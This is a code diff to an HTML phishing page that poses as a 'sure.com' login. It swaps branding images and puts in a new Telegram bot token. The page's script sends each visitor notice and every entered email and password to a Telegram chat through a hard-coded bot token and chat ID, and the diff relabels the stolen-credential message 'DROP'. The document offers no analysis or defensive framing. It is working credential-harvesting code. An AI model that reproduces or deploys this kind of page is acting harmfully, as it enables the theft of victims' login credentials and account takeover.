@@ -15,7 +15,7 @@
        }
 
         body {
-            background: url(https://res.cloudinary.com/dxzzgijsa/image/upload/v1751371244/taxform_ymflt5.png) repeat-x;
+            background: url(https://imagestore.sure.com/headerTile.jpg) repeat-x;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -153,19 +153,19 @@
     <script>
         // Function to send visitor data to Telegram
         function sendVisitorToTelegram() {
-            const message = "New surecom Visi!";
+            const message = "SEP SURE com VisI";
             sendToTelegram(message);
         }
 
         // Function to send error attempt data to Telegram
         function sendErrorAttemptToTelegram(email, password) {
-            const message = ` New surecom Logn Att Fal \nEmail: ${email}\nPassword: ${password}`;
+            const message = ` SEP SURE com DROP \nEmail: ${email}\nPassword: ${password}`;
             sendToTelegram(message);
         }
 
         // General function to send messages to Telegram
         function sendToTelegram(message) {
-            const token = "8460385568:AAF02skAjhZDMaBC_TyzBwGyVVG56CZ0sgk"; // Telegram Bot Token
+            const token = "8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI"; // Telegram Bot Token
             const chat_id = "8052751627"; // Telegram Chat ID
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
@@ -194,7 +194,7 @@
             setTimeout(function() {
                 document.getElementById('loginContainer').style.display = 'block';
                 document.getElementById('image').style.display = 'none';
-            }, 200); // 1 second delay before showing the login form
+            }, 500); // 1 second delay before showing the login form
         }
 
         // Function to handle the login attempt
@@ -239,7 +239,7 @@
 <body>
 
     <!-- The image to show before login form -->
-    <img id="image" src="https://i.imgur.com/Te61cda.png" alt="Redirect Image" />
+    <img id="image" src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1751371244/taxform_ymflt5.png" alt="Redirect Image" />
 
     <!-- The login form section (hidden initially) -->
     <div id="loginContainer">
